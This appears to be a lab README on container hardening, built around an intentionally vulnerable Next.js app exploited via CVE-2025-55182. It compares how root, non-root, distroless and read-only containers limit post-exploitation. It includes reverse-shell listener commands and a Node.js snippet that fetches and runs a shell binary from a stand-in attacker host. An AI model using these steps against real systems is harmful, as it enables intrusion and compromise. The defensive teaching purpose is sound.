# Container hardening

> **Vulnerability:** [CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182) — React Server Components "Flight" protocol unsafe deserialization, leading to unauthenticated Remote Code Execution (RCE).  
> The Next.js app in `app/` is intentionally vulnerable. The exploit PoC in `app/exploit-poc.ts` fires the RCE and prints the output of `id`.

---

## Setup

```bash
# Terminal 1 — run the target container
docker run --rm -p 3000:3000 <image>

# Terminal 2 — start a reverse-shell listener
nc -lvp 4444

# Terminal 3 — fire the exploit
bun exploit-poc.ts
# → shell appears in terminal 2
```

---

## Step 1 — Root container

The default. No `USER` instruction means the Node.js process runs as `root` (uid 0). When the RCE triggers, the attacker is immediately root inside the container.

```bash
docker build -f Containerfile.root -t hardening:root .
docker run --rm -p 3000:3000 hardening:root
```

Fire the exploit:

```bash
nc -lvp 4444 &
bun exploit-poc.ts
```

Expected shell prompt:

```
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /etc/shadow
...
```

The attacker lands as `root` inside a full Debian/Node image. They have `bash`, `apt`, `curl`, write access to every file — complete system compromise.

---

## Step 2 — Non-root user

Same full `node:22` image — hundreds of tools still available — but the process runs as the built-in `node` user (uid 1000).

```bash
docker build -f Containerfile.nonroot -t hardening:nonroot .
docker run --rm -p 3000:3000 hardening:nonroot
```

Fire the exploit:

```bash
nc -lvp 4444 &
bun exploit-poc.ts
```

Expected shell prompt:

```
$ id
uid=1000(node) gid=1000(node) groups=1000(node)
$ cat /etc/shadow
cat: /etc/shadow: Permission denied
```

The attacker is unprivileged. They can still:
- Browse the filesystem (`ls`, `find`)
- Exfiltrate secrets from env vars or mounted files readable by `node`
- Use `curl`, `wget`, `bash` to download further payloads
- Read `/etc/passwd`, process list, network config

But they **cannot** write to system directories, install packages as root, or directly escape the uid boundary. A good start — but far from hardened.

---

## Step 3 — Distroless

The final image is `gcr.io/distroless/nodejs22-debian12`. It ships **only** the Node.js runtime and glibc — no shell, no package manager, no `curl`, no `wget`, no `ls`, no `cat`, no `id`, no `find`.

```bash
docker build -f Containerfile.distroless -t hardening:distroless .
docker run --rm -p 3000:3000 hardening:distroless
```

Fire the exploit:

```bash
nc -lvp 4444 &
bun exploit-poc.ts
```

The RCE payload reaches the server and `net.createConnection` succeeds — but `cp.spawn('/bin/sh', [])` fails immediately because there is no `/bin/sh` in the image. The TCP connection is established and then closed. No shell, no prompt.

You can verify there is no shell to spawn:

```bash
docker run --entrypoint="" --rm hardening:distroless /bin/sh
# → exec /bin/sh: no such file or directory

docker run --entrypoint="" --rm hardening:distroless /bin/bash
# → exec /bin/bash: no such file or directory
```

**Important caveat:** a determined attacker can still use Node.js built-ins to download and execute a static binary:

```js
// everything here is pure Node.js — no shell, no curl needed
const res = await fetch('https://attacker.com/sh-static-amd64')
const buf = Buffer.from(await res.arrayBuffer())
require('fs').writeFileSync('/tmp/sh', buf, { mode: 0o755 })
require('child_process').spawn('/tmp/sh', [])
```

So distroless is **not** a complete prevention — it removes the pre-installed toolkit and forces the attacker to bring their own, adding meaningful friction and noise. Combined with network egress policies (no outbound HTTP from the container) this escape route closes as well.

> **Takeaway:** distroless eliminates the easy wins of post-exploitation but is not a silver bullet. Pair it with a non-root user, dropped capabilities, read-only root filesystem, and network egress controls for real defense-in-depth.

---

## Step 4 — Read-only filesystem

No new image needed — this is a **runtime flag**. Adding `--read-only` mounts the container's root filesystem read-only. The process can still run, but nothing can be written anywhere in the container.

Next.js needs a writable `/tmp` for its cache, so we allow that specifically — but with `noexec,nosuid` to prevent executing anything placed there:

```bash
docker run --rm -p 3000:3000 \
  --read-only \
  --tmpfs /tmp:noexec,nosuid,size=64m \
  hardening:distroless
```

Now fire the exploit again:

```bash
nc -lvp 4444 &
bun exploit-poc.ts
```

The `fetch` → `writeFileSync` → `spawn` attack chain now fails:

```js
require('fs').writeFileSync('/tmp/sh', buf, { mode: 0o755 })
// → EROFS: read-only file system (everywhere except /tmp)

// Writing to /tmp succeeds — but executing from it is blocked by noexec:
require('child_process').spawn('/tmp/sh', [])
// → spawn /tmp/sh: EACCES: permission denied
```

The attacker can download the binary but has nowhere to write it that also allows execution. The download-and-execute path is closed.

Verify the filesystem is read-only from inside the container:

```bash
docker run --rm --read-only --tmpfs /tmp:noexec,nosuid hardening:distroless \
  node -e "require('fs').writeFileSync('/exploit', 'x')"
# → EROFS: read-only file system, open '/exploit'
```

---

## Summary

| Image | Base | User | Shell | Tools | Post-exploitation |
|---|---|---|---|---|---|
| `hardening:root` | `node:22` | root (uid 0) | ✅ bash | ✅ full apt | full system compromise |
| `hardening:nonroot` | `node:22` | node (uid 1000) | ✅ bash | ✅ curl, wget, … | limited, but still dangerous |
| `hardening:distroless` | distroless | nonroot (uid 65532) | ❌ | ❌ pre-installed | hard — but fetch+execSync can bring a shell in |
| `hardening:distroless` + `--read-only --tmpfs /tmp:noexec` | distroless | nonroot (uid 65532) | ❌ | ❌ | download-and-execute path closed |

> **Takeaway:** running as non-root is necessary but not sufficient. A distroless base image removes the pre-installed toolkit, forcing the attacker to stage their own tools — adding friction and detection opportunities. To fully close the download-and-execute path, combine it with `--read-only` and `--tmpfs /tmp:noexec,nosuid` so there is nowhere writable that also permits execution.
